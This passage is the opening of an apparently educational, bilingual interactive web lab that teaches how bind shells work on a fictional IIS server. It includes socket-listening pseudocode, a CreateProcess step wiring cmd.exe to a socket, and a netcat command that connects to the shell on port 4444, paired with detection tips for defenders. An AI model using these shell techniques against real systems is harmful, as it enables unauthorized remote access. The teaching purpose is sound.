@@ -1,0 +1,1766 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><style>:root{color-scheme:light}body{margin:0;font:14px system-ui}[hidden]{display:none!important}</style></head><body><title>Shells Explorer</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@600;700&family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap">
+<style>
+/* Layout: sticky header with tabs; each view is a column of sections.
+   Stage views = animated network scene on top, guide card + two terminals below. */
+:root {
+  --bg: #f1f4f8; --surface: #ffffff; --surface2: #e8edf4; --ink: #121c2a; --muted: #536274; --line: #cdd6e2;
+  --kali: #b8174f; --kali-soft: #fae1ea; --on-kali: #ffffff;
+  --win: #1560b8; --win-soft: #dbe9f9; --on-win: #ffffff;
+  --fw: #a35f00; --fw-soft: #fcefd2;
+  --ok: #17753f; --ok-soft: #dcf2e5; --bad: #bd2424; --bad-soft: #fbe0e0;
+  --term-bg: #0e1620; --term-fg: #d3e0ee; --t-dim: #7d90a6; --t-prompt: #6fb0ff; --t-ok: #5fd89a; --t-err: #ff8a8a; --t-log: #f0c060;
+  --f-display: "Bricolage Grotesque", "Segoe UI", system-ui, sans-serif;
+  --f-body: "IBM Plex Sans", "Segoe UI", system-ui, sans-serif;
+  --f-mono: "IBM Plex Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+  --r: 10px;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0b111a; --surface: #131c28; --surface2: #1b2736; --ink: #e5edf6; --muted: #94a5b9; --line: #273649;
+    --kali: #ff7aa6; --kali-soft: #3a1727; --on-kali: #240a14;
+    --win: #62aeff; --win-soft: #11294a; --on-win: #08203d;
+    --fw: #f2b650; --fw-soft: #392a0d;
+    --ok: #4fd68c; --ok-soft: #12301f; --bad: #ff8080; --bad-soft: #3b1717;
+    --term-bg: #070b11; --term-fg: #cfe0f2; --t-dim: #71859c;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0b111a; --surface: #131c28; --surface2: #1b2736; --ink: #e5edf6; --muted: #94a5b9; --line: #273649;
+  --kali: #ff7aa6; --kali-soft: #3a1727; --on-kali: #240a14;
+  --win: #62aeff; --win-soft: #11294a; --on-win: #08203d;
+  --fw: #f2b650; --fw-soft: #392a0d;
+  --ok: #4fd68c; --ok-soft: #12301f; --bad: #ff8080; --bad-soft: #3b1717;
+  --term-bg: #070b11; --term-fg: #cfe0f2; --t-dim: #71859c;
+  color-scheme: dark;
+}
+* { box-sizing: border-box; }
+body { background: var(--bg); color: var(--ink); font-family: var(--f-body); font-size: 15px; line-height: 1.55; }
+body::before { content: ""; position: fixed; inset: 0 0 auto; height: env(safe-area-inset-top, 0px); z-index: 30; background: var(--surface); }
+button, input, select { font: inherit; color: inherit; }
+button { cursor: pointer; }
+:focus-visible { outline: 3px solid var(--win); outline-offset: 2px; border-radius: 4px; }
+h1, h2, h3, h4 { font-family: var(--f-display); line-height: 1.2; margin: 0; text-wrap: balance; letter-spacing: -0.01em; }
+h1 { font-size: clamp(28px, 4.4vw, 44px); font-weight: 700; }
+h2 { font-size: clamp(21px, 2.6vw, 28px); font-weight: 650; }
+h3 { font-size: 18px; font-weight: 650; }
+h4 { font-size: 13px; font-weight: 650; text-transform: uppercase; letter-spacing: .07em; color: var(--muted); font-family: var(--f-body); }
+p { margin: 0; }
+code { font-family: var(--f-mono); font-size: .92em; }
+.mono { font-family: var(--f-mono); }
+code { background: var(--surface2); padding: 1px 5px; border-radius: 4px; }
+a { color: var(--win); }
+
+.app { max-width: 1220px; margin: 0 auto; padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); }
+.top { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 20; background: var(--surface); border-bottom: 1px solid var(--line); }
+.top .inner { padding-top: 8px; display: flex; flex-wrap: wrap; align-items: center; gap: 4px 18px; }
+.brand { display: flex; align-items: center; gap: 10px; padding-bottom: 8px; }
+.brand b { font-family: var(--f-display); font-size: 19px; font-weight: 700; display: block; line-height: 1.1; }
+.brand small { color: var(--muted); font-size: 12px; display: block; }
+.tabs { display: flex; gap: 2px; overflow-x: auto; flex: 1 1 360px; min-width: 0; scrollbar-width: thin; }
+.tab { background: none; border: 0; border-bottom: 3px solid transparent; padding: 10px 12px 9px; font-weight: 550; color: var(--muted); white-space: nowrap; }
+.tab:hover { color: var(--ink); }
+.tab[aria-selected="true"] { color: var(--ink); border-bottom-color: var(--win); }
+.tab[data-k="bind"][aria-selected="true"], .tab[data-k="reverse"][aria-selected="true"], .tab[data-k="web"][aria-selected="true"] { border-bottom-color: var(--kali); }
+.tools { padding-bottom: 8px; display: flex; gap: 8px; }
+.btn { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 6px 12px; font-weight: 550; display: inline-flex; align-items: center; gap: 6px; }
+.btn:hover:not(:disabled) { border-color: var(--win); }
+.btn:disabled { opacity: .45; cursor: not-allowed; }
+.btn.primary { background: var(--win); color: var(--on-win); border-color: var(--win); }
+.btn.kali { background: var(--kali); color: var(--on-kali); border-color: var(--kali); }
+.btn.small { padding: 3px 9px; font-size: 13px; }
+
+main { padding-block: 22px 40px; display: flex; flex-direction: column; gap: 28px; }
+.view { display: flex; flex-direction: column; gap: 22px; }
+.sec { display: flex; flex-direction: column; gap: 12px; }
+.lead { font-size: 17px; color: var(--muted); max-width: 70ch; }
+.card { background: var(--surface); border: 1px solid var(--line); border-radius: var(--r); padding: 16px 18px; min-width: 0; }
+.callout { border-radius: var(--r); padding: 12px 14px; border: 1px solid var(--line); background: var(--surface2); }
+.callout.def { background: var(--fw-soft); border-color: var(--fw); }
+.callout.def h4, .callout.def b.t { color: var(--fw); }
+.callout.warn { background: var(--bad-soft); border-color: var(--bad); }
+.callout.ok { background: var(--ok-soft); border-color: var(--ok); }
+.grid2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 14px; }
+.grid3 { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; }
+.grid4 { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; }
+@media (max-width: 900px) { .grid3, .grid4 { grid-template-columns: repeat(2, minmax(0, 1fr)); } }
+@media (max-width: 640px) { .grid2, .grid3, .grid4 { grid-template-columns: minmax(0, 1fr); } }
+.pill { display: inline-block; font-size: 12px; font-weight: 650; padding: 1px 8px; border-radius: 99px; border: 1px solid currentColor; letter-spacing: .03em; }
+.pill.k { color: var(--kali); } .pill.w { color: var(--win); } .pill.f { color: var(--fw); } .pill.o { color: var(--ok); } .pill.b { color: var(--bad); }
+
+/* path cards */
+.path a.card { text-decoration: none; color: inherit; display: flex; flex-direction: column; gap: 6px; border-top: 4px solid var(--win); }
+.path a.card:hover { border-color: var(--kali); }
+.path .n { font-family: var(--f-mono); font-size: 12px; color: var(--muted); }
+
+/* scene */
+.scene-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: var(--r); background: var(--surface); }
+.scene { display: block; width: 100%; min-width: 760px; height: auto; }
+.scene text { fill: var(--ink); font-family: var(--f-body); }
+.scene .mono { font-family: var(--f-mono); }
+.scene .muted { fill: var(--muted); }
+.zone-net { fill: var(--surface2); opacity: .55; }
+.zone-lan { fill: var(--win-soft); opacity: .6; }
+.node { fill: var(--surface); stroke-width: 2.5; transition: stroke-width .2s, filter .2s; }
+.node.k { stroke: var(--kali); } .node.w { stroke: var(--win); }
+.node.hl { stroke-width: 5; }
+.row rect { fill: var(--surface2); stroke: var(--line); stroke-width: 1.5; transition: stroke .2s, fill .2s; }
+.row.pulse rect { stroke: var(--win); stroke-width: 4; fill: var(--win-soft); }
+.row { transition: opacity .35s; }
+.row.off { opacity: 0; pointer-events: none; }
+.wall { fill: var(--fw-soft); stroke: var(--fw); stroke-width: 2.5; }
+.wall.hl { stroke-width: 5; }
+.brick { stroke: var(--fw); stroke-width: 1; opacity: .5; }
+.sock { fill: var(--surface); stroke-width: 3; transition: opacity .3s; }
+.sock.k { stroke: var(--kali); } .sock.w { stroke: var(--win); }
+.sock.off { opacity: 0; }
+.chip { transition: opacity .3s; }
+.chip.off { opacity: 0; }
+.scene .chip.listen, .scene .chip.on { fill: var(--ok); } .scene .chip.syn { fill: var(--fw); } .scene .chip.bad { fill: var(--bad); }
+.link { stroke-width: 3; fill: none; transition: opacity .3s; }
+.link.off { opacity: 0; }
+.link.shell { stroke: var(--ok); } .link.http { stroke: var(--win); stroke-dasharray: 8 6; }
+.scene .linklabel { font-size: 13px; font-weight: 600; fill: var(--ok); transition: opacity .3s; }
+.linklabel.off { opacity: 0; }
+.pk rect { stroke: none; }
+.pk.k rect { fill: var(--kali); } .pk.w rect { fill: var(--win); }
+.pk text { font-family: var(--f-mono); font-size: 12px; font-weight: 600; }
+.pk.k text { fill: var(--on-kali); } .pk.w text { fill: var(--on-win); }
+.xmark { fill: none; stroke: var(--bad); stroke-width: 5; stroke-linecap: round; }
+.xmark.off, .stateTag.off, .pipe.off { opacity: 0; }
+.pipe { transition: opacity .3s; }
+.pipe text { font-family: var(--f-mono); font-size: 12px; fill: var(--muted); }
+.pipe path { stroke: var(--muted); stroke-width: 2; fill: none; }
+.stateTag text { font-family: var(--f-mono); font-size: 12px; fill: var(--fw); font-weight: 600; }
+.pickable { cursor: pointer; }
+.pickable:hover .node, .pickable:hover .wall { stroke-width: 5; }
+
+/* fw rules */
+.rules { display: grid; grid-template-columns: minmax(0, 1fr); gap: 3px; font-family: var(--f-mono); font-size: 12.5px; }
+.rules .r { padding: 3px 8px; border-radius: 5px; background: var(--surface2); border: 1px solid transparent; display: flex; gap: 10px; flex-wrap: wrap; }
+.rules .r.hit { border-color: var(--fw); background: var(--fw-soft); }
+.rules .r.deny b { color: var(--bad); } .rules .r.allow b { color: var(--ok); }
+.rules .st { color: var(--muted); }
+
+/* controls */
+.ctl { display: flex; flex-wrap: wrap; align-items: center; gap: 8px 10px; }
+.steps { display: flex; gap: 6px; overflow-x: auto; padding-bottom: 4px; scrollbar-width: thin; }
+.stp { flex: 0 0 auto; display: flex; align-items: center; gap: 6px; background: var(--surface); border: 1px solid var(--line); border-radius: 99px; padding: 4px 12px 4px 5px; font-size: 13px; font-weight: 550; color: var(--muted); }
+.stp i { font-style: normal; font-family: var(--f-mono); width: 22px; height: 22px; border-radius: 50%; display: grid; place-items: center; background: var(--surface2); font-size: 12px; }
+.stp.done i { background: var(--ok); color: var(--surface); }
+.stp.cur { color: var(--ink); border-color: var(--kali); }
+.stp.cur i { background: var(--kali); color: var(--on-kali); }
+.seg { display: inline-flex; border: 1px solid var(--line); border-radius: 8px; overflow: hidden; }
+.seg button { background: var(--surface); border: 0; padding: 5px 11px; font-size: 13px; font-weight: 550; }
+.seg button[aria-pressed="true"] { background: var(--win); color: var(--on-win); }
+
+.stage { display: grid; grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); gap: 16px; align-items: start; }
+@media (max-width: 960px) { .stage { grid-template-columns: minmax(0, 1fr); } }
+.guide { display: flex; flex-direction: column; gap: 12px; }
+.guide .hd { display: flex; gap: 10px; align-items: baseline; flex-wrap: wrap; }
+.guide .hd .num { font-family: var(--f-mono); color: var(--kali); font-weight: 600; }
+.guide p + p { margin-top: 8px; }
+.cmdblock { background: var(--term-bg); color: var(--term-fg); border-radius: 8px; padding: 10px 12px; font-family: var(--f-mono); font-size: 13px; overflow-x: auto; }
+.cmdblock .who { display: inline-block; font-size: 11px; font-weight: 650; padding: 0 7px; border-radius: 4px; margin-bottom: 4px; letter-spacing: .04em; }
+.who.k { background: var(--kali); color: var(--on-kali); } .who.w { background: var(--win); color: var(--on-win); } .who.ps { background: var(--fw); color: var(--surface); } .who.http { background: var(--ok); color: var(--surface); }
+.cmdblock pre { margin: 0; white-space: pre; }
+.tok { background: none; border: 0; border-bottom: 1px dotted var(--t-prompt); color: var(--term-fg); font: inherit; padding: 0 1px; cursor: help; }
+.tok:hover, .tok[aria-pressed="true"] { background: rgba(111,176,255,.25); }
+.tokinfo { margin-top: 6px; font-family: var(--f-body); font-size: 13px; color: var(--t-log); min-height: 1.4em; white-space: normal; }
+details.why { border: 1px solid var(--line); border-radius: 8px; padding: 8px 12px; background: var(--surface2); }
+details.why summary { cursor: pointer; font-weight: 600; }
+details.why[open] summary { margin-bottom: 6px; }
+.predict { border: 2px dashed var(--kali); border-radius: var(--r); padding: 12px 14px; background: var(--kali-soft); }
+.predict .q { font-weight: 650; margin: 4px 0 8px; }
+.opts { display: flex; flex-direction: column; gap: 6px; }
+.opt { text-align: left; background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 7px 11px; }
+.opt:hover:not(:disabled) { border-color: var(--kali); }
+.opt.right { border-color: var(--ok); background: var(--ok-soft); }
+.opt.wrong { border-color: var(--bad); background: var(--bad-soft); }
+.predict .fb { margin-top: 8px; }
+ul.pts { margin: 0; padding-left: 20px; display: flex; flex-direction: column; gap: 4px; }
+.tasks { list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 6px; }
+.tasks li { display: flex; gap: 8px; align-items: flex-start; }
+.tasks .chk { flex: 0 0 20px; height: 20px; border-radius: 50%; border: 2px solid var(--line); display: grid; place-items: center; font-size: 12px; margin-top: 2px; }
+.tasks li.done .chk { background: var(--ok); border-color: var(--ok); color: var(--surface); }
+.tasks button.try { background: var(--surface2); border: 1px solid var(--line); border-radius: 5px; font-family: var(--f-mono); font-size: 12.5px; padding: 0 6px; }
+.tasks button.try:hover { border-color: var(--win); }
+
+/* terminals */
+.terms { display: flex; flex-direction: column; gap: 14px; min-width: 0; }
+.term { background: var(--term-bg); color: var(--term-fg); border-radius: var(--r); overflow: hidden; border: 1px solid var(--line); min-width: 0; }
+.term .th { display: flex; align-items: center; justify-content: space-between; gap: 8px; padding: 6px 12px; font-size: 12.5px; font-weight: 600; border-bottom: 1px solid #ffffff22; }
+.term .th.k { background: var(--kali); color: var(--on-kali); } .term .th.w { background: var(--win); color: var(--on-win); }
+.term .tb { height: 250px; overflow: auto; padding: 8px 12px; font-family: var(--f-mono); font-size: 12px; line-height: 1.45; white-space: pre; }
+.term .ln.log, .term .ln.wrap { white-space: pre-wrap; overflow-wrap: anywhere; }
+.term .ln.pr { color: var(--t-prompt); }
+.term .ln .c { color: #fff; }
+.term .ln.dim { color: var(--t-dim); font-style: italic; }
+.term .ln.err { color: var(--t-err); }
+.term .ln.log .tag { color: var(--t-log); font-weight: 600; }
+.term .caret::after { content: "▌"; animation: blink 1s steps(2) infinite; color: var(--t-prompt); }
+@keyframes blink { 50% { opacity: 0; } }
+.term form { display: flex; align-items: center; gap: 8px; padding: 6px 12px 8px; border-top: 1px solid #ffffff22; font-family: var(--f-mono); font-size: 13px; }
+.term form .pl { color: var(--t-prompt); white-space: nowrap; }
+.term form input { flex: 1; min-width: 0; background: #ffffff10; border: 1px solid #ffffff30; border-radius: 5px; color: #fff; padding: 4px 8px; font-family: var(--f-mono); font-size: 13px; }
+.term .tf { display: flex; gap: 6px; padding: 6px 12px; border-top: 1px solid #ffffff22; flex-wrap: wrap; }
+
+/* lab */
+.lab { display: grid; grid-template-columns: minmax(0, 340px) minmax(0, 1fr); gap: 16px; align-items: start; }
+@media (max-width: 960px) { .lab { grid-template-columns: minmax(0, 1fr); } }
+.fieldset { border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; display: flex; flex-direction: column; gap: 10px; background: var(--surface); }
+.fieldset legend, .fieldset .lg { font-size: 12px; font-weight: 650; text-transform: uppercase; letter-spacing: .07em; color: var(--muted); }
+.fld { display: flex; flex-direction: column; gap: 4px; padding-left: 8px; border-left: 3px solid transparent; }
+.fld.used { border-left-color: var(--ok); }
+.fld.unused { opacity: .55; }
+.fld label.l { font-weight: 600; font-size: 13.5px; }
+.fld .hint { font-size: 12.5px; color: var(--muted); }
+.fld select { background: var(--surface); border: 1px solid var(--line); border-radius: 6px; padding: 5px 8px; }
+.sw { display: flex; gap: 8px; align-items: center; }
+.sw input { width: 18px; height: 18px; accent-color: var(--win); }
+.checks { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 6px; }
+.checks li { display: flex; gap: 10px; padding: 8px 10px; border-radius: 8px; border: 1px solid var(--line); background: var(--surface2); }
+.checks li .ic { flex: 0 0 22px; height: 22px; border-radius: 50%; display: grid; place-items: center; font-weight: 700; font-size: 13px; }
+.checks li.pass .ic { background: var(--ok); color: var(--surface); }
+.checks li.fail { border-color: var(--bad); background: var(--bad-soft); }
+.checks li.fail .ic { background: var(--bad); color: var(--surface); }
+.checks li.skip { opacity: .5; }
+.verdict { font-family: var(--f-display); font-size: 20px; font-weight: 700; }
+.verdict.ok { color: var(--ok); } .verdict.no { color: var(--bad); }
+
+/* compare / quiz / glossary */
+.tbl-wrap { overflow-x: auto; border: 1px solid var(--line); border-radius: var(--r); }
+table.cmp { border-collapse: collapse; width: 100%; min-width: 760px; background: var(--surface); font-size: 14px; }
+table.cmp th, table.cmp td { padding: 9px 12px; text-align: left; border-bottom: 1px solid var(--line); vertical-align: top; }
+table.cmp thead th { background: var(--surface2); position: sticky; top: 0; font-family: var(--f-display); font-size: 15px; }
+table.cmp tbody th { width: 17%; color: var(--muted); font-weight: 600; font-size: 13px; }
+table.cmp tbody tr:hover td, table.cmp tbody tr:hover th { background: var(--surface2); }
+.quiz { display: flex; flex-direction: column; gap: 14px; }
+.qcard { display: flex; flex-direction: column; gap: 8px; }
+.gloss { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 10px; }
+@media (max-width: 760px) { .gloss { grid-template-columns: minmax(0, 1fr); } }
+.gloss dt { font-weight: 650; font-family: var(--f-display); }
+.gloss dd { margin: 2px 0 0; color: var(--muted); }
+.gloss > div { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 10px 12px; }
+.glossq { width: 100%; max-width: 420px; border: 1px solid var(--line); background: var(--surface); border-radius: 8px; padding: 8px 12px; }
+
+/* intro figures */
+.fig { overflow-x: auto; border: 1px solid var(--line); border-radius: var(--r); background: var(--surface); }
+.fig svg { display: block; min-width: 720px; width: 100%; max-width: 940px; margin: 0 auto; height: auto; }
+.fig svg text { fill: var(--ink); font-family: var(--f-body); }
+.fig .nbox { fill: var(--surface2); stroke: var(--line); stroke-width: 2; }
+.fig .nbox.k { stroke: var(--kali); } .fig .nbox.w { stroke: var(--win); }
+.fig .arrow { stroke: var(--muted); stroke-width: 2.5; fill: none; }
+.fig .dot { fill: var(--fw); stroke: var(--surface); stroke-width: 2; }
+.fig .lbl { font-family: var(--f-mono); font-size: 13px; fill: var(--muted); }
+.cap { font-size: 13.5px; color: var(--muted); min-height: 2.7em; }
+.mini { display: flex; gap: 8px; flex-wrap: wrap; }
+.verdict-box { min-height: 5.5em; }
+.fine { font-size: 13px; color: var(--muted); }
+.scroll-hint { display: none; }
+@media (max-width: 800px) { .scroll-hint { display: block; } }
+footer.foot { border-top: 1px solid var(--line); padding-block: 18px 30px; color: var(--muted); font-size: 13px; }
+
+@media (prefers-reduced-motion: reduce) {
+  * { animation: none !important; transition: none !important; }
+}
+
+/* hunt exercise + misc */
+.stp span { max-width: 210px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.hunt { display: flex; flex-direction: column; gap: 6px; }
+.hrow { display: flex; gap: 10px; align-items: flex-start; padding: 8px 10px; border: 1px solid var(--line); border-radius: 8px; background: var(--term-bg); color: var(--term-fg); font-family: var(--f-mono); font-size: 12.5px; cursor: pointer; word-break: break-word; }
+.hrow input { margin-top: 3px; accent-color: var(--kali); flex: none; }
+.hrow .tag { color: var(--t-log); font-weight: 600; }
+.hrow .why { display: block; font-family: var(--f-body); font-size: 13px; margin-top: 4px; color: var(--term-fg); }
+.hrow.good { border-color: var(--ok); } .hrow.miss { border-color: var(--bad); } .hrow.fp { border-color: var(--fw); }
+.hrow .res { font-family: var(--f-body); font-weight: 650; font-size: 12px; }
+.scorebar { font-size: 13px; color: var(--muted); }
+</style>
+<header class="top"><div class="app inner">
+  <div class="brand"><svg width="34" height="34" viewBox="0 0 34 34" aria-hidden="true"><rect x="1" y="1" width="32" height="32" rx="8" fill="var(--term-bg)" stroke="var(--kali)" stroke-width="2"/><path d="M9 12l6 5-6 5" fill="none" stroke="var(--t-prompt)" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/><path d="M18 23h8" stroke="var(--kali)" stroke-width="2.4" stroke-linecap="round"/></svg><div><b>Shells Explorer</b><small id="tag"></small></div></div>
+  <nav class="tabs" id="nav" role="tablist"></nav>
+  <div class="tools"><button class="btn small" id="langBtn" type="button">EN</button></div>
+</div></header>
+<div class="app"><main id="main"></main><footer class="foot" id="foot"></footer></div>
+<script>
+/* ============ Content: the three guided stages ============
+   All names, IPs and logs are fictional. 203.0.113.0/24 and 198.51.100.0/24 are RFC 5737 documentation ranges. */
+const T = (es, en) => ({ es, en });
+const IP_K = '203.0.113.50', IP_FW = '198.51.100.10', IP_W = '10.0.0.20';
+const CWD0 = 'C:\\Windows\\System32\\inetsrv';
+const ID_POOL = 'IIS APPPOOL\\DefaultAppPool';
+const kc = (s) => ({ t: 'kc', s });
+const o = (s) => ({ t: 'o', s });
+const rp = (p, c) => ({ t: 'rp', p, c });
+const lg = (tag, s) => ({ t: 'lg', tag, s });
+const wc = (s) => ({ t: 'wc', s });
+const ns = (mode, filter) => ({ t: 'ns', mode, filter });
+const BANNER = [o('Microsoft Windows [Version 10.0.20348.2113]'), o('(c) Microsoft Corporation. All rights reserved.'), o('')];
+
+const NCV = 'nc -nv 198.51.100.10 4444';
+const NCV_TOK = [
+  ['nc', T('Netcat: abre una conexión TCP y conecta tu teclado y tu pantalla a ella.', 'Netcat: opens a TCP connection and wires your keyboard and screen to it.')],
+  ['-nv', T('-n: no resolver nombres (usa la IP tal cual). -v: verboso, informa si la conexión se abre, se rechaza o expira.', '-n: skip name resolution (use the IP as given). -v: verbose, reports whether the connection opened, was refused or timed out.')],
+  ['198.51.100.10', T('IP pública del servidor: la del firewall, que la traduce a 10.0.0.20.', 'The server’s public IP: the firewall’s, which translates it to 10.0.0.20.')],
+  ['4444', T('Puerto TCP donde escucha el payload.', 'TCP port where the payload is listening.')],
+];
+const EXPLOIT_PKT = { pk: 'k>w', lane: 'http', label: 'HTTPS · exploit' };
+const PIPE_PSEUDO = T(
+  'CreateProcess("cmd.exe",\n   stdin  = c,     # lo que llega por el socket entra como si fuera teclado\n   stdout = c,     # lo que cmd.exe escribe sale por el socket\n   stderr = c)     # los errores también',
+  'CreateProcess("cmd.exe",\n   stdin  = c,     # whatever arrives on the socket enters as if typed\n   stdout = c,     # whatever cmd.exe prints leaves through the socket\n   stderr = c)     # so do the errors'
+);
+const ROW_A = { t1: 'IIS · w3wp.exe', t2: ID_POOL };
+const ROW_PAYLOAD = { t1: 'payload.exe', t2: T('hijo de w3wp · misma identidad', 'child of w3wp · same identity') };
+const ROW_CMD = { t1: 'cmd.exe', t2: 'stdin/stdout ⇄ socket' };
+
+const LIVE_TASKS_SHELL = (kind) => [
+  { cmd: 'whoami', q: T('¿Con qué identidad corre la shell? ¿Es administrador?', 'Which identity does the shell run as? Is it an administrator?') },
+  { cmd: 'ipconfig', q: T('¿Qué IP ve el propio servidor? Compárala con la IP pública a la que conectó Kali.', 'Which IP does the server itself see? Compare it with the public IP Kali connected to.') },
+  { cmd: 'cd C:\\inetpub\\wwwroot', q: T('¿Cambia el prompt? La shell recuerda el directorio porque es un único proceso cmd.exe.', 'Does the prompt change? The shell remembers the directory because it is a single cmd.exe process.') },
+  { cmd: 'dir', q: T('Explora la raíz web del portal. ¿Qué carpeta recibe las subidas de los usuarios?', 'Browse the portal’s web root. Which folder receives user uploads?') },
+  { cmd: 'netstat -ano', q: kind === 'bind'
+      ? T('Localiza tu propia conexión: puerto local 4444 (el del payload), remoto = tu Kali.', 'Find your own connection: local port 4444 (the payload’s), remote = your Kali.')
+      : T('Localiza tu propia conexión: es SALIENTE; el puerto local es efímero y el remoto es el 4444 de Kali.', 'Find your own connection: it is OUTBOUND; the local port is ephemeral and the remote is Kali’s 4444.') },
+  { cmd: 'exit', q: T('Cierra la sesión: cmd.exe termina, el payload cierra el socket y el listener o el cliente de Kali vuelve al prompt local.', 'End the session: cmd.exe exits, the payload closes the socket and Kali’s listener/client returns to the local prompt.') },
+];
+
+const STAGES = {};
+
+/* ---------------------------------------------------------------- BIND */
+STAGES.bind = {
+  name: T('Bind shell', 'Bind shell'),
+  goal: T('El servidor escucha en un puerto y el atacante se conecta a él.', 'The server listens on a port and the attacker connects to it.'),
+  steps: [
+    {
+      title: T('Punto de partida: ya hay ejecución de código', 'Starting point: code execution already exists'),
+      what: T('Una shell no es una vulnerabilidad: es el <b>canal</b> que construyes <i>después</i> de lograr ejecución de código. Aquí asumimos que el portal de ACME (IIS en Windows Server 2022) tiene una falla que permite al atacante ejecutar un programa en el servidor. El firewall perimetral sólo deja entrar tráfico web (80 y 443), así que el exploit viaja dentro de una petición HTTPS normal.',
+        'A shell is not a vulnerability: it is the <b>channel</b> you build <i>after</i> you get code execution. Here we assume ACME’s portal (IIS on Windows Server 2022) has a flaw that lets the attacker run a program on the server. The perimeter firewall only lets web traffic in (80 and 443), so the exploit rides inside an ordinary HTTPS request.'),
+      predict: {
+        q: T('¿Por qué el exploit atraviesa un firewall que sólo permite 80 y 443?', 'Why does the exploit get through a firewall that only allows 80 and 443?'),
+        opts: [T('El firewall está roto.', 'The firewall is broken.'), T('Viaja dentro de una petición a un puerto que sí está permitido (443).', 'It rides inside a request to a port that is allowed (443).'), T('Usa UDP, que los firewalls no filtran.', 'It uses UDP, which firewalls do not filter.')],
+        ok: 1,
+        why: T('El firewall decide por dirección, puerto y estado de la conexión, no por la intención de lo que va dentro. Un puerto permitido es un camino abierto para cualquier contenido, bueno o malo.', 'The firewall decides by address, port and connection state, not by the intent of what travels inside. An allowed port is an open road for any content, good or bad.'),
+      },
+      def: T('Hasta aquí es un POST a 443 como cualquier otro. Sólo un WAF o la telemetría del servidor (qué procesos lanza w3wp.exe) puede distinguirlo.', 'So far this is a POST to 443 like any other. Only a WAF or the server’s own telemetry (which processes w3wp.exe launches) can tell it apart.'),
+      scene: { rows: { A: ROW_A }, fwHit: 'in80', hl: ['fw'] },
+      anim: [EXPLOIT_PKT, { pulse: ['A'] }, { pk: 'w>k', lane: 'http', label: '200 OK' }],
+      k: [],
+      w: [lg('FW', 'ALLOW tcp 203.0.113.50:50412 → 198.51.100.10:443 · rule IN allow tcp 80,443'), lg('IIS', '2026-10-23 14:58:03 10.0.0.20 POST /portal/export - 443 - 203.0.113.50 Mozilla/5.0 - 200 0 0 212')],
+    },
+    {
+      title: T('El payload abre un socket y se pone a escuchar', 'The payload opens a socket and starts listening'),
+      what: T('w3wp.exe ejecuta el payload: un programa pequeño que pide cuatro cosas al sistema operativo (pseudocódigo abajo). Con <code>listen()</code> el servidor pasa a ser quien <b>espera</b>; nadie ha conectado todavía. El payload hereda la identidad del proceso que lo lanzó: la cuenta del pool de IIS, no un administrador.',
+        'w3wp.exe runs the payload: a tiny program that asks the operating system for four things (pseudocode below). With <code>listen()</code> the server becomes the one that <b>waits</b>; nobody has connected yet. The payload inherits the identity of the process that launched it: the IIS app-pool account, not an administrator.'),
+      cmd: [{ who: 'ps', text: T('s = socket(TCP)             # crea un extremo de comunicación\nbind(s, 0.0.0.0:4444)       # lo asocia al puerto 4444 de todas las interfaces\nlisten(s)                   # estado LISTEN: acepta conexiones entrantes\nc = accept(s)               # se bloquea hasta que alguien conecte',
+        's = socket(TCP)             # creates a communication endpoint\nbind(s, 0.0.0.0:4444)       # attaches it to port 4444 on every interface\nlisten(s)                   # LISTEN state: accepts incoming connections\nc = accept(s)               # blocks until somebody connects') }],
+      why: T('<code>0.0.0.0</code> significa “todas las interfaces IPv4 del host”. El puerto 4444 es sólo una convención (es el predeterminado de los handlers de Metasploit); cualquier puerto libre sirve. Escuchar no envía ni un paquete: el servidor se limita a dejar un socket abierto esperando un SYN.',
+        '<code>0.0.0.0</code> means “every IPv4 interface on the host”. Port 4444 is only a convention (it is the default in Metasploit handlers); any free port works. Listening sends no packet at all: the server just leaves a socket open, waiting for a SYN.'),
+      predict: {
+        q: T('El servidor ya está en LISTEN. ¿Quién envía el primer paquete (SYN)?', 'The server is now in LISTEN. Who sends the first packet (SYN)?'),
+        opts: [T('El atacante (cliente).', 'The attacker (client).'), T('El servidor, hacia el atacante.', 'The server, toward the attacker.'), T('Ambos a la vez.', 'Both at once.')],
+        ok: 0,
+        why: T('Un socket en LISTEN sólo responde. La conexión la inicia quien hace <code>connect()</code>: en una bind shell, el atacante.', 'A socket in LISTEN only answers. The connection is started by whoever calls <code>connect()</code>: in a bind shell, the attacker.'),
+      },
+      def: T('Un puerto nuevo en LISTEN abierto por un hijo de w3wp.exe es raro en un servidor web. Se ve con <code>netstat -ano</code>, con Sysmon (evento 3) o, si activas la auditoría de la plataforma de filtrado, con el evento 5154.', 'A new LISTEN port opened by a child of w3wp.exe is unusual on a web server. You can see it with <code>netstat -ano</code>, with Sysmon (event 3) or, if you enable Filtering Platform auditing, with event 5154.'),
+      scene: { rows: { B: ROW_PAYLOAD }, wSock: true, chips: { w1: { t: 'LISTEN\n:4444', c: 'listen' } }, hl: ['w'] },
+      anim: [{ pulse: ['A'] }, { pulse: ['B'] }],
